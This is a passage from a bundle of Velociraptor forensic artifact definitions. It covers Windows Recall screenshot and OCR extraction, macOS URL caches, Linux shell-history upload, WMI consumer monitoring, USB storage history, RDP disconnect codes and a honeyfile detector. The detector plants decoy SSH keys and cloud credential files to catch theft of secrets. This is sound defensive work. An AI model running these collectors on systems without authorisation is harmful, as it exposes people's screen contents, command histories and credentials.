   NOTE: There are many other very useful events in the database, this arefact just looks at the Capture Creation events. 
   
parameters:
  - name: ukgPath
    default: /AppData/Local/CoreAIPlatform.00/UKP/*/ukg.db
  - name: SQLiteQuery
    default: |
        SELECT WindowCapture.TimeStamp as TimeStamp, WindowCapture.Name as EventName, WindowCapture.WindowTitle as WindowTitle, WindowCapture.WindowId as WindowId, App.Path as Process, WindowCaptureTextIndex_content.c2 as OcrText, ImageToken FROM WindowCaptureTextIndex_content INNER JOIN WindowCapture ON WindowCapture.Id == WindowCaptureTextIndex_content.c0 INNER JOIN WindowCaptureAppRelation ON WindowCaptureAppRelation.WindowCaptureId == WindowCaptureTextIndex_content.c0 INNER JOIN App ON App.Id == WindowCaptureAppRelation.AppId WHERE WindowCapture.Name == "WindowCaptureEvent" AND OcrText IS NOT NULL

  - name: userRegex
    default: .
    type: regex

precondition: SELECT OS From info() where OS = 'windows'

sources:
  - query: |
        LET db_files = SELECT * from foreach(
          row={
             SELECT Uid, Name AS User, Directory+ukgPath as globPath,
                    expand(path=Directory) AS HomeDirectory
             FROM Artifact.Windows.Sys.Users()
             WHERE Name =~ userRegex
          },
          query={
             SELECT User, OSPath, Mtime, HomeDirectory
             FROM glob(globs=globPath)
          })

        SELECT timestamp(epoch=TimeStamp) as Timestamp,
               EventName,
               WindowTitle,
               WindowId,
               Process,
               OcrText,
               upload(file=regex_replace(source=OSPath,re="ukg\.db",replace="ImageStore\\"+ImageToken)) AS Capture
        FROM foreach(row=db_files,
          query={
            SELECT *,OSPath
            FROM sqlite(
              file=OSPath,
              query=SQLiteQuery)
          })

column_types:
- name: Capture
  type: preview_upload

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Applications.Cache.yaml
======
name: MacOS.Applications.Cache
description: |
    Applications can use the NSURL cache to store specific data that is useful to the operation of the application in a `Cache.db` file on disk. The data contained within this file could potentially be useful to investigators or incident responders, such as URLs that were accessed, as well as data requested or returned.

reference:
  - https://developer.apple.com/documentation/foundation/nsurl

type: CLIENT

author: Wes Lambert - @therealwlambert

parameters:
- name: CacheGlob
  default: /Users/*/Library/Caches/*/Cache.db

precondition:
      SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
      LET CacheList = SELECT FullPath
       FROM glob(globs=split(string=CacheGlob, sep=","))

      LET CacheQuery = SELECT *
       FROM sqlite(file=FullPath, query="SELECT cfurl_cache_response.entry_ID AS entry_ID, version, hash_value, storage_policy, request_key, time_stamp, partition, request_object, response_object FROM cfurl_cache_response INNER JOIN cfurl_cache_blob_data ON cfurl_cache_response.entry_ID = cfurl_cache_blob_data.entry_ID INNER JOIN cfurl_cache_receiver_data ON cfurl_cache_response.entry_ID = cfurl_cache_receiver_data.entry_ID")
      
      SELECT * FROM foreach(
          row=CacheList,
          query={ 
              SELECT
                  time_stamp AS Timestamp,
                  basename(path=dirname(path=FullPath)) AS Application,
                  entry_ID AS EntryID,
                  version AS Version,
                  hash_value AS Hash,
                  storage_policy AS StoragePolicy,
                  request_key AS URL,
                  plist(file=request_object, accessor="data") AS Request,
                  plist(file=response_object, accessor="data") AS Response,
                  partition AS Partition,
                  FullPath
              FROM CacheQuery
          }
      )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.HistoryFiles.yaml
======
name: Linux.Collection.History
author: alternate
description: |
  Collect history files from unix/linux utilities and upload them.
  Based on TriageHistory from forensicartifacts.com

reference:
  - https://github.com/ForensicArtifacts/artifacts/blob/main/data/triage.yaml

precondition: SELECT OS FROM info() WHERE OS = 'linux'

parameters:
- name: BashShellHistoryFile
  default: |
    ["/{root,home/*}/.bash_logout","/{root,home/*}/.bash_profile",
     "/{root,home/*}/.bashrc","/etc/bash.bashrc","/etc/bashrc"]

- name: BourneShellHistoryFile
  default: /{root,home/*}/.sh_history

- name: FishShellHistoryFile
  default: /{root,home/*}/.local/share/fish/fish_history

- name: MySQLHistoryFile
  default: /{root,home/*}/.mysql_history

- name: PostgreSQLHistoryFile
  default: |
    ["/var/lib/postgresql/.psql_history","/var/lib/pgsql/.psql_history","/{root,home/*}/.psql_history"]

- name: PythonHistoryFile
  default: /{root,home/*}/.python_history

- name: SQLiteHistoryFile 
  default: /{root,home/*}/.sqlite_history

- name: ZShellHistoryFile
  default: |
    ["/{root,home/*}/.zhistory","/{root,home/*}/.zsh_history"]

- name: LessHistoryFile
  default: /{root,home/*}/.lesshst

- name: NanoHistoryFile
  default: /{root,home/*}/.nano_history

sources:
- name: uploadBashShellHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=BashShellHistoryFile))

- name: uploadBourneShellHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=BourneShellHistoryFile)

- name: uploadFishShellHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=FishShellHistoryFile)

- name: uploadMySQLHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=MySQLHistoryFile)

- name: uploadPostgreSQLHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=PostgreSQLHistoryFile))

- name: uploadPythonHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=PythonHistoryFile)

- name: uploadSQLiteHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=SQLiteHistoryFile)

- name: uploadZShellHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=parse_json_array(data=ZShellHistoryFile))

- name: uploadLessHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=LessHistoryFile)

- name: uploadNanoHistoryFile
  query: |
    SELECT OSPath,
           Mtime,
           upload(file=OSPath) AS Upload
    FROM glob(globs=NanoHistoryFile)

---END OF FILE---

======
FILE: /content/exchange/artifacts/WMIEventing.yaml
======
name: Windows.ETW.WMIEventing
author: Matt Green - @mgreen27
description: |
    This artifact collects events associated with creation and deletion of WMI 
    Event Consumers. All Event Consumers created under any namespace will 
    generate events which are filtered on event consumer classes.  
    
    It uses the ETW provider:
    Microsoft-Windows-WMI-Activity {1418ef04-b0b4-4623-bf7e-d74ab47bbdaa}  
    Note: This provider events have support on Windows 10+

type: CLIENT_EVENT

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'
      
    query: |
      LET RecentProcesses = SELECT * FROM fifo(query={
                SELECT System.TimeStamp AS CreateTime, 
                    EventData.ImageName AS ImageName,
                    int(int=EventData.ProcessID) AS Pid,
                    EventData.MandatoryLabel AS MandatoryLabel,
                    EventData.ProcessTokenElevationType AS ProcessTokenElevationType,
                    EventData.ProcessTokenIsElevated AS TokenIsElevated
                FROM watch_etw(guid="{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}", any=0x10)
                WHERE System.ID = 1   
            }, max_rows=1000, max_age=60)
        
      -- Query it once to materialize the FIFO
      LET _ <= SELECT * FROM RecentProcesses
        
      LET GetProcessInfo(TargetPid) = SELECT * FROM switch(
            -- First try to get the pid directly
            a={
                SELECT 
                    Name, Pid, CreateTime,
                    Exe as ImageName,
                    CommandLine,
                    Username,
                    TokenIsElevated
                FROM pslist(pid=TargetPid)
            },
            -- Failing this look in the FIFO for a recently started process.
            b={
                SELECT
                    basename(path=ImageName) as Name,
                    Pid,
                    CreateTime,
                    ImageName,
                    Null as CommandLine,
                    Null as Username,
                    if(condition= TokenIsElevated="0", 
                        then= false, 
                        else= true ) as TokenIsElevated
                FROM RecentProcesses
                WHERE Pid = TargetPid
                LIMIT 1
            })
            
      -- watch ETW provider and first round data manipulation
      SELECT
            System.TimeStamp AS EventTime,
            System.ID as EventId,
            strip(prefix='\\\\\.\\',string=EventData.NamespaceName) as NamespaceName,
            EventData.Operation as Operation,
            GetProcessInfo(TargetPid=int(int=EventData.ClientProcessId))[0] as Process,
            EventData.IsLocal as IsLocal,
            EventData.ClientMachine as ClientMachine,
            EventData.ClientMachineFQDN as ClientMachineFQDN,
            EventData.User as User,
            EventData.CorrelationId as CorrelationId,
            EventData.OperationId as OperationId,
            EventData.GroupOperationId as GroupOperationId
        FROM watch_etw(guid="{1418ef04-b0b4-4623-bf7e-d74ab47bbdaa}")
        WHERE EventId = 11
            AND Operation =~ 'WbemServices::(PutInstance|DeleteInstance|PutClass|DeleteClass)'
            AND Operation =~ 'EventConsumer|EventFilter|FilterToConsumerBinding'

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Mounted.Mass.Storage.yaml
======
name: Windows.Mounted.Mass.Storage
author: "Yaniv Radunsky & Kobi Arami @ 10root cyber security"
description: |
   Find drives/usb mass storage that were mounted


parameters:
  - name: programKeys
    default: >-
      HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR\*\*


sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'
    queries:
      - |
        SELECT Key.Name as KeyName,
               Key.Mtime AS KeyLastWriteTimestamp,
               FriendlyName,
               HardwareID
        FROM read_reg_key(globs=split(string=programKeys, sep=',[\\s]*'),
                          accessor="registry")

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Detection.Honeyfiles.yaml
======
name: Linux.Detection.Honeyfiles
author: Zane Gittins & Matt Green (@mgreen27).
description: |
    This artifact deploys honeyfiles according to the Honeyfiles CSV parameter. It then monitors access to these files using eBPF.  The process tracker must be enabled, we use this to enrich events. You also must be using Velociraptor >= 0.74 to support eBPF. Honeyfiles created by this artifact are removed at exit.

    * TargetPath - Location to create honeyfile.
    * Enabled - Only generate the honeyfile if this is set to 'Y'
    * MagicBytes - The starting magic bytes of the honeyfile.
    * MinSize,MaxSize - The size of the honeyfile will be a random value between MinSize and MaxSize.

type: CLIENT_EVENT

parameters:
   - name: Honeyfiles
     description: The honeyfiles to generate and monitor.
     type: csv
     default: |
         TargetPath,Enabled,MagicBytes,MinSize,MaxSize
         "%USERPROFILE%/.ssh/my_id_rsa",Y,2D2D2D2D2D424547494E205253412050524956415445204B45592D2D2D2D2D,10249,20899
         "%USERPROFILE%/.aws/credentials",Y,5B64656661756C745D,512,2048
         "%USERPROFILE%/.gcloud/credentials.db",Y,53514c69746520666f726d6174203300,512,2048
         "%USERPROFILE%/.azure/azureProfile.json",Y,7B0D0A,512,2048
   - name: ProcessExceptionsRegex
     description: Except these processes from detections when they access honeyfiles.
     type: string
     default: "/usr/bin/updatedb"
   - name: HoneyUserRegex
     description: User name regex that will be used to host honeyfiles.
     type: string
     default: "."
sources:
  - precondition:
        SELECT OS From info() where OS = 'linux' AND version(plugin="watch_ebpf") >= 0

    query: |
       LET RandomChars(size) = SELECT
           format(format="%02x", args=rand(range=256)) AS HexByte
         FROM range(end=size)
       
       LET check_exist(path) = SELECT
           OSPath,
           Size,
           IsDir,
           if(condition=read_file(filename=OSPath)[-7:] =~ 'VRHoney',
              then=True,
              else=False) AS IsHoneyFile
         FROM stat(filename=path)
       
       LET enumerate_path = SELECT regex_replace(source=TargetPath,
                                                 re='''\%USERPROFILE\%''',
                                                 replace=Homedir) AS TargetPath,
                                   *,
                                   check_exist(path=regex_replace(
                                                 source=TargetPath,
                                                 re='''\%USERPROFILE\%''',
                                                 replace=Homedir))[0] AS Exists,
                                   MaxSize - rand(range=(MaxSize - MinSize)) -
                                     len(list=unhex(string=MagicBytes)) - 7 AS _PaddingSize
         FROM Honeyfiles
       
       LET target_users = SELECT User,
                                 Homedir,
                                 Uid
         FROM Artifact.Linux.Sys.Users()
         WHERE int(int=Uid) >= 1000
          AND NOT Homedir = '/nonexistent'
               AND User =~ HoneyUserRegex
       
       LET show_honeyfiles = SELECT TargetPath,
                                    Enabled,
                                    MagicBytes,
                                    MinSize,
                                    MaxSize,
                                    _PaddingSize,
                                    Exists.Size AS Size,
                                    Exists.IsHoneyFile AS IsHoneyFile
         FROM foreach(row=target_users, query=enumerate_path)
       
       LET copy_honeyfiles = SELECT
           *, if(condition=Enabled =~ "^(Y|YES)$"
                  AND (NOT Size OR IsHoneyFile),
                 then=log(message="Creating file %v", dedup=-1, args=TargetPath)
                  AND copy(dest=TargetPath,
                           create_directories='y',
                           accessor='data',
                           filename=unhex(
                             string=MagicBytes + join(
                               array=RandomChars(size=_PaddingSize).HexByte) +
                               format(format='%x', args='VRHoney'))),
                 else="File does not exist") AS CreateHoneyFile
         FROM show_honeyfiles
       
       LET remove_honeyfiles = SELECT
           *, _PaddingSize,
           if(condition=IsHoneyFile,
              then=log(message="Removing %v", args=TargetPath, dedup=-1)
               AND rm(filename=TargetPath),
              else="File does not exist") AS RemoveHoneyFile
         FROM show_honeyfiles
       
       LET add_honeyfiles = SELECT
           TargetPath,
           Enabled,
           MagicBytes,
           MinSize,
           MaxSize,
           check_exist(path=TargetPath)[0].Size AS Size,
           check_exist(path=TargetPath)[0].IsHoneyFile AS IsHoneyFile
         FROM copy_honeyfiles
       
       LET _ <= atexit(query={ SELECT * FROM remove_honeyfiles })
       
       LET WatchFiles <= to_dict(item={
           SELECT TargetPath AS _key,
                  IsHoneyFile AS _value
           FROM add_honeyfiles
           WHERE IsHoneyFile
         })
       
       LET CurrentPid <= getpid()
       
       LET TargetEvents = SELECT *
         FROM watch_ebpf(events=["security_file_open"])
         WHERE System.EventName = "security_file_open"
          AND System.ProcessID != CurrentPid
       
       LET AuditEvents = SELECT
           *, timestamp(string=System.Timestamp) AS Timestamp,
           get(item=WatchFiles, field=EventData.pathname) AS IsHoneyFile
         FROM TargetEvents
         WHERE IsHoneyFile != NULL
       
       LET Track = SELECT
           Timestamp,
           System.ProcessID AS Pid,
           EventData.pathname AS FileName,
           process_tracker_get(id=System.ProcessID).Data AS ProcInfo,
           join(array=process_tracker_callchain(id=System.ProcessID).Data.Name,
                sep="->") AS CallChain,
           (System.ProcessID+EventData.pathname) as DedupKey
         FROM AuditEvents
         WHERE NOT ProcInfo.Exe =~ ProcessExceptionsRegex
       
       SELECT 
         Timestamp,
         Pid,
         FileName,
         ProcInfo,
         CallChain 
       FROM dedup(query={
          SELECT *,
          FROM delay(query=Track, delay=5)
       },key="DedupKey",timeout=2)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.EventLogs.RDPClientActivity.yaml
======
name: Windows.EventLogs.RDPClientActivity
author: "Marinus Boekelo - Northwave"
description: |
    This artifact retrieves outgoing RDP session activity from the
    Microsoft-Windows-TerminalServices-RDPClient event logs. It aggregates
    sessions based on ActivityID and outputs hostname, timeframe and disconnect reasons.
    The latter is filled using a dict that was taken from MS Docs (see references)

type: CLIENT

reference:
  - https://social.technet.microsoft.com/wiki/contents/articles/37870.remote-desktop-client-troubleshooting-disconnect-codes-and-reasons.aspx

parameters:
  - name: EvtxGlob
    default: '%SystemRoot%\System32\winevt\Logs\Microsoft-Windows-TerminalServices-RDPClient%4Operational.evtx'
  - name: SearchVSS
    description: "Add VSS into query."
    type: bool
  - name: DateAfter
    type: timestamp
    description: "search for events after this date. YYYY-MM-DDTmm:hh:ssZ"
  - name: DateBefore
    type: timestamp
    description: "search for events before this date. YYYY-MM-DDTmm:hh:ssZ"

sources:
    - query: |

        -- Definitions of disconnect reasons (see references)
        LET DisconnectReasonLookup <= dict(
            `0` = "No error",
            `1` = "User-initiated client disconnect.",
            `2` = "User-initiated client logoff.",
            `3` = "Your Remote Desktop Services session has ended, possibly for one of the following reasons: The administrator has ended the session. An error occurred while the connection was being established. A network problem occurred. For help solving the problem, see Remote Desktop in Help and Support.",
            `4` = "Extended Reason: The remote session ended because the total login time limit was reached. This limit is set by the server administrator or by network policies.",
            `5` = "Extended Reason: Your Remote Desktop Services session has ended. Another user connected to the remote computer, so your connection was lost. Try connecting again, or contact your network administrator or technical support  group.",
            `6` = "Extended Reason: The connection was disconnected because the remote computer is low on memory.",
            `7` = "Extended Reason: This computer can't connect to the remote computer. Try connecting again. If the problem continues, contact the owner of the remote computer or your network administrator.",
            `8` = "Extended Reason: The client could not establish a connection to the remote computer. The most likely causes for this error are: 1) Remote connections might not be enabled at the remote computer. 2) The maximum number of  connections was exceeded at the remote computer. 3) A network error occurred while establishing a connection. 4) The remote computer might not support the required FIPS security level. Please lower the client side required security level Policy, or contact  your network administrator for assistance.",
            `9` = "Extended Reason: The connection was denied because the user account is not authorized for remote login.",
            `256` = "Extended Reason: The remote session was disconnected because there was an internal error in the remote computer's licensing protocol.",
            `257` = "Extended Reason: The remote session was disconnected because there are no Remote Desktop License Servers available to provide a license. Please contact the server administrator.",
            `258` = "Extended Reason: The remote session was disconnected because there are no Remote Desktop client access licenses available for this computer. Please contact the server administrator.",
            `259` = "Extended Reason: The remote session was disconnected because the remote computer received an invalid licensing message from this computer.",
            `260` = "Remote Desktop can't find the computer. This might mean that it does not belong to the specified network. Verify the computer name and domain that you are trying to connect to.",
            `261` = "Extended Reason: The remote session was disconnected because the Remote Desktop client access license stored on this computer is in an invalid format.",
            `262` = "This computer can't connect to the remote computer. Your computer does not have enough virtual memory available. Close your other programs, and then try connecting again. If the problem continues, contact your network administrator  or technical support.",
            `263` = "Extended Reason: The remote session was disconnected because the client prematurely ended the licensing protocol.",
            `264` = "This computer can't connect to the remote computer. The two computers couldn't connect in the amount of time allotted. Try connecting again. If the problem continues, contact your network administrator or technical support.",
            `265` = "Extended Reason: The remote session was disconnected because the local computer's client access license could not be upgraded or renewed. Please contact the server administrator.",
            `266` = "The smart card service is not running. Please start the smart card service and try again.",
            `267` = "Extended Reason: The remote session was disconnected because license store creation failed with access denied. Please run the remote desktop client with elevated privileges.",
            `516` = "Remote Desktop can't connect to the remote computer for one of these reasons: 1) Remote access to the server is not enabled 2) The remote computer is turned off 3) The remote computer is not available on the network Make  sure the remote computer is turned on and connected to the network, and that remote access is enabled.",
            `522` = "A smart card reader was not detected. Please attach a smart card reader and try again.",
            `772` = "This computer can't connect to the remote computer. The connection was lost due to a network error. Try connecting again. If the problem continues, contact your network administrator or technical support.",
            `778` = "There is no card inserted in the smart card reader. Please insert your smart card and try again.",
            `1024` = "Extended Reason: Remote Desktop Connection could not find the destination computer. This can happen if the computer name is incorrect or the computer is not yet registered with RD Connection Broker. Try connecting again,  or contact your network administrator.",
            `1026` = "Extended Reason: An error occurred while Remote Desktop Connection was loading the destination computer. Try connecting again, or contact your network administrator.",
            `1028` = "Extended Reason: An error occurred while Remote Desktop Connection was redirecting to the destination computer. Try connecting again, or contact your network administrator.",
            `1029` = "Extended Reason: Couldn't connect to the remote computer (there was a problem setting up the virtual machine). Try connecting again, or contact your network administrator for help.",
            `1030` = "Because of a security error, the client could not connect to the remote computer. Verify that you are logged on to the network, and then try connecting again.",
            `1031` = "Extended Reason: Windows can't find the IP address of the destination virtual machine. This can happen if the virtual machine doesn't have Hyper-V enlightenments and the name of the virtual machine doesn't match the computer  name in Windows. Contact your network administrator for assistance.",
            `1032` = "The specified computer name contains invalid characters. Please verify the name and try again.",
            `1033` = "Extended Reason: Connection processing has been canceled. Try connecting again, or contact your network administrator.",
            `1034` = "An error has occurred in the smart card subsystem. Please contact your helpdesk about this error.",
            `1040` = "Extended Reason: Your computer can't connect to the remote computer because the Connection Broker couldn't validate the settings specified in your RDP file. Contact your network administrator for assistance.",
            `1041` = "Extended Reason: A timeout error occurred while Remote Desktop Connection was starting the virtual machine. Try connecting again, or contact your network administrator.",
            `1042` = "Extended Reason: A session monitoring error occurred while Remote Desktop Connection was starting the virtual machine. Try connecting again, or contact your network administrator.",
            `1796` = "This computer can't connect to the remote computer. Try connecting again. If the problem continues, contact the owner of the remote computer or your network administrator.",
            `1800` = "Your computer could not connect to another console session on the remote computer because you already have a console session in progress.",
            `2056` = "The remote computer disconnected the session because of an error in the licensing protocol. Please try connecting to the remote computer again or contact your server administrator.",
            `2308` = "Your Remote Desktop Services session has ended. The connection to the remote computer was lost, possibly due to network connectivity problems. Try connecting to the remote computer again. If the problem continues, contact  your network administrator or technical support.",
            `2311` = "The connection has been terminated because an unexpected server authentication certificate was received from the remote computer. Try connecting again. If the problem continues, contact the owner of the remote computer or  your network administrator.",
            `2312` = "A licensing error occurred while the client was attempting to connect (Licensing timed out). Please try connecting to the remote computer again.",
            `2567` = "The specified username does not exist. Verify the username and try logging in again. If the problem continues, contact your system administrator or technical support.",
            `2820` = "This computer can't connect to the remote computer. An error occurred that prevented the connection. Try connecting again. If the problem continues, contact the owner of the remote computer or your network administrator.",
            `2822` = "Because of an error in data encryption, this session will end. Please try connecting to the remote computer again.",
            `2823` = "The user account is currently disabled and cannot be used. For assistance, contact your system administrator or technical support.",
            `2825` = "The remote computer requires Network Level Authentication, which your computer does not support. For assistance, contact your system administrator or technical support.",
            `3079` = "A user account restriction (for example, a time-of-day restriction) is preventing you from logging on. For assistance, contact your system administrator or technical support.",
            `3080` = "The remote session was disconnected because of a decompression failure at the client side. Please try connecting to the remote computer again.",
            `3335` = "As a security precaution, the user account has been locked because there were too many logon attempts or password change attempts. Wait a while before trying again, or contact your system administrator or technical support.",
            `3337` = "The security policy of your computer requires you to type a password on the Windows Security dialog box. However, the remote computer you want to connect to cannot recognize credentials supplied using the Windows Security  dialog box. For assistance, contact your system administrator or technical support.",
            `3590` = "The client can't connect because it doesn't support FIPS encryption level. Please lower the server side required security level Policy, or contact your network administrator for assistance",
            `3591` = "This user account has expired. For assistance, contact your system administrator or technical support.",
            `3592` = "Failed to reconnect to your remote session. Please try to connect again.",
            `3593` = "The remote PC doesn't support Restricted Administration mode.",
            `3847` = "This user account's password has expired. The password must change in order to logon. Please update the password or contact your system administrator or technical support.",
            `3848` = "A connection will not be made because credentials may not be sent to the remote computer. For assistance, contact your system administrator.",
            `4103` = "The system administrator has restricted the times during which you may log in. Try logging in later. If the problem continues, contact your system administrator or technical support.",
            `4104` = "The remote session was disconnected because your computer is running low on video resources. Close your other programs, and then try connecting again. If the problem continues, contact your network administrator or technical  support.",
            `4339` = "Extended Reason: The remote computer does not support RemoteApp. For assistance, contact your system administrator.",
            `4359` = "The system administrator has limited the computers you can log on with. Try logging on at a different computer. If the problem continues, contact your system administrator or technical support.",
            `4498` = "Extended Reason: The remote session was disconnected because of a decryption error at the server. Please try connecting to the remote computer again.",
            `4615` = "You must change your password before logging on the first time. Please update your password or contact your system administrator or technical support.",
            `4871` = "The system administrator has restricted the types of logon (network or interactive) that you may use. For assistance, contact your system administrator or technical support.",
            `5127` = "The Kerberos sub-protocol User2User is required. For assistance, contact your system administrator or technical support.",
            `6919` = "Remote Desktop cannot connect to the remote computer because the authentication certificate received from the remote computer is expired or invalid. In some cases, this error might also be caused by a large time discrepancy  between the client and server computers.",
            `7431` = "Remote Desktop cannot verify the identity of the remote computer because there is a time or date difference between your computer and the remote computer. Make sure your computer's clock is set to the correct time, and then  try connecting again. If the problem occurs again, contact your network administrator or the owner of the remote computer.",
            `8711` = "Your computer can't connect to the remote computer because your smart card is locked out. Contact your network administrator about unlocking your smart card or resetting your PIN.",
            `9479` = "Could not auto-reconnect to your applications,please re-launch your applications",
            `9732` = "Client and server versions do not match. Please upgrade your client software and then try connecting again.",
            `33554433` = "Failed to reconnect to the remote program. Please restart the remote program.",
            `33554434` = "The remote computer does not support RemoteApp. For assistance, contact your system administrator.",
            `50331649` = "Your computer can't connect to the remote computer because the username or password is not valid. Type a valid user name and password.",
            `50331650` = "Your computer can't connect to the remote computer because it can't verify the certificate revocation list. Contact your network administrator for assistance.",
            `50331651` = "Your computer can't connect to the remote computer due to one of the following reasons: 1) The requested Remote Desktop Gateway server address and the server SSL certificate subject name do not match. 2) The certificate  is expired or revoked. 3) The certificate root authority does not trust the certificate. Contact your network administrator for assistance.",
            `50331652` = "Your computer can't connect to the remote computer because the SSL certificate was revoked by the certification authority. Contact your network administrator for assistance.",
            `50331653` = "This computer can't verify the identity of the RD Gateway. It's not safe to connect to servers that can't be identified. Contact your network administrator for assistance.",
            `50331654` = "Your computer can't connect to the remote computer because the Remote Desktop Gateway server address requested and the certificate subject name do not match. Contact your network administrator for assistance.",
            `50331655` = "Your computer can't connect to the remote computer because the Remote Desktop Gateway server's certificate has expired or has been revoked. Contact your network administrator for assistance.",
            `50331656` = "Your computer can't connect to the remote computer because an error occurred on the remote computer that you want to connect to. Contact your network administrator for assistance.",
            `50331657` = "An error occurred while sending data to the Remote Desktop Gateway server. The server is temporarily unavailable or a network connection is down. Try again later, or contact your network administrator for assistance.",
            `50331658` = "An error occurred while receiving data from the Remote Desktop Gateway server. Either the server is temporarily unavailable or a network connection is down. Try again later, or contact your network administrator for assistance.",
            `50331659` = "Your computer can't connect to the remote computer because an alternate logon method is required. Contact your network administrator for assistance.",
            `50331660` = "Your computer can't connect to the remote computer because the Remote Desktop Gateway server address is unreachable or incorrect. Type a valid Remote Desktop Gateway server address.",
            `50331661` = "Your computer can't connect to the remote computer because the Remote Desktop Gateway server is temporarily unavailable. Try reconnecting later or contact your network administrator for assistance.",
            `50331662` = "Your computer can't connect to the remote computer because the Remote Desktop Services client component is missing or is an incorrect version. Verify that setup was completed successfully, and then try reconnecting later.",
            `50331663` = "Your computer can't connect to the remote computer because the Remote Desktop Gateway server is running low on server resources and is temporarily unavailable. Try reconnecting later or contact your network administrator  for assistance.",
            `50331664` = "Your computer can't connect to the remote computer because an incorrect version of rpcrt4.dll has been detected. Verify that all components for Remote Desktop Gateway client were installed correctly.",
            `50331665` = "Your computer can't connect to the remote computer because no smart card service is installed. Install a smart card service and then try again, or contact your network administrator for assistance.",
            `50331666` = "Your computer can't stay connected to the remote computer because the smart card has been removed. Try again using a valid smart card, or contact your network administrator for assistance.",
            `50331667` = "Your computer can't connect to the remote computer because no smart card is available. Try again using a smart card.",
            `50331668` = "Your computer can't stay connected to the remote computer because the smart card has been removed. Reinsert the smart card and then try again.",
            `50331669` = "Your computer can't connect to the remote computer because the user name or password is not valid. Please type a valid user name and password.",
            `50331671` = "Your computer can't connect to the remote computer because a security package error occurred in the transport layer. Retry the connection or contact your network administrator for assistance.",
            `50331672` = "The Remote Desktop Gateway server has ended the connection. Try reconnecting later or contact your network administrator for assistance.",
            `50331673` = "The Remote Desktop Gateway server administrator has ended the connection. Try reconnecting later or contact your network administrator for assistance.",
            `50331674` = "Your computer can't connect to the remote computer due to one of the following reasons: 1) Your credentials (the combination of user name, domain, and password) were incorrect. 2) Your smart card was not recognized.",
            `50331675` = "Remote Desktop can't connect to the remote computer for one of these reasons: 1) Your user account is not listed in the RD Gateway's permission list 2) You might have specified the remote computer in NetBIOS format (for  example, computer1), but the RD Gateway is expecting an FQDN or IP address format (for example, computer1.fabrikam.com or 157.60.0.1). Contact your network administrator for assistance.",
            `50331676` = "Remote Desktop can't connect to the remote computer for one of these reasons: 1) Your user account is not authorized to access the RD Gateway 2) Your computer is not authorized to access the RD Gateway 3) You are  using an incompatible authentication method (for example, the RD Gateway might be expecting a smart card but you provided a password) Contact your network administrator for assistance.",
            `50331679` = "Your computer can't connect to the remote computer because your network administrator has restricted access to this RD Gateway server. Contact your network administrator for assistance.",
            `50331680` = "Your computer can't connect to the remote computer because the web proxy server requires authentication. To allow unauthenticated traffic to an RD Gateway server through your web proxy server, contact your network administrator.",
            `50331681` = "Your computer can't connect to the remote computer because your password has expired or you must change the password. Please change the password or contact your network administrator or technical support for assistance.",
            `50331682` = "Your computer can't connect to the remote computer because the Remote Desktop Gateway server reached its maximum allowed connections. Try reconnecting later or contact your network administrator for assistance.",
            `50331683` = "Your computer can't connect to the remote computer because the Remote Desktop Gateway server does not support the request. Contact your network administrator for assistance.",
            `50331684` = "Your computer can't connect to the remote computer because the client does not support one of the Remote Desktop Gateway's capabilities. Contact your network administrator for assistance.",
            `50331685` = "Your computer can't connect to the remote computer because the Remote Desktop Gateway server and this computer are incompatible. Contact your network administrator for assistance.",
            `50331686` = "Your computer can't connect to the remote computer because the credentials used are not valid. Insert a valid smart card and type a PIN or password, and then try connecting again.",
            `50331687` = "Your computer can't connect to the remote computer because your computer or device did not pass the Network Access Protection requirements set by your network administrator. Contact your network administrator for assistance.",
            `50331688` = "Your computer can't connect to the remote computer because no certificate was configured to use at the Remote Desktop Gateway server. Contact your network administrator for assistance.",
            `50331689` = "Your computer can't connect to the remote computer because the RD Gateway server that you are trying to connect to is not allowed by your computer administrator. If you are the administrator, add this Remote Desktop Gateway  server name to the trusted Remote Desktop Gateway server list on your computer and then try connecting again.",
            `50331690` = "Your computer can't connect to the remote computer because your computer or device did not meet the Network Access Protection requirements set by your network administrator, for one of the following reasons: 1) The Remote  Desktop Gateway server name and the server's public key certificate subject name do not match. 2) The certificate has expired or has been revoked. 3) The certificate root authority does not trust the certificate. 4) The certificate key extension does not support  encryption. 5) Your computer cannot verify the certificate revocation list. Contact your network administrator for assistance.",
            `50331691` = "Your computer can't connect to the remote computer because a user name and password are required to authenticate to the Remote Desktop Gateway server instead of smart card credentials.",
            `50331692` = "Your computer can't connect to the remote computer because smart card credentials are required to authenticate to the Remote Desktop Gateway server instead of a user name and password.",
            `50331693` = "Your computer can't connect to the remote computer because no smart card reader is detected. Connect a smart card reader and then try again, or contact your network administrator for assistance.",
            `50331695` = "Your computer can't connect to the remote computer because authentication to the firewall failed due to missing firewall credentials. To resolve the issue, go to the firewall website that your network administrator recommends,  and then try the connection again, or contact your network administrator for assistance.",
            `50331696` = "Your computer can't connect to the remote computer because authentication to the firewall failed due to invalid firewall credentials. To resolve the issue, go to the firewall website that your network administrator recommends,  and then try the connection again, or contact your network administrator for assistance.",
            `50331698` = "Your Remote Desktop Services session ended because the remote computer didn't receive any input from you.",
